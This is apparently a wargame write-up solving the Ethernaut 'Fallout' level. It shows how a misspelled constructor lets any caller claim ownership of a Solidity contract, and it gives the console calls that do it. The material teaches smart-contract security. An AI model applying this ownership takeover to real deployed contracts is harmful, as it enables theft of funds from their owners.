# 02. Fallout

Claim ownership of the contract below to complete this level.

Things that might help:

- Solidity Remix IDE

## Solution

...

a typo...

in the constructor name...

`Fal1out` instead of `Fallout`

```solidity
function Fal1out() public payable {
  owner = msg.sender;
  allocations[owner] = msg.value;
}
```

```javascript
await contract.Fal1out({value: toWei('0.00000001')})
await contract.owner() == player
// true
```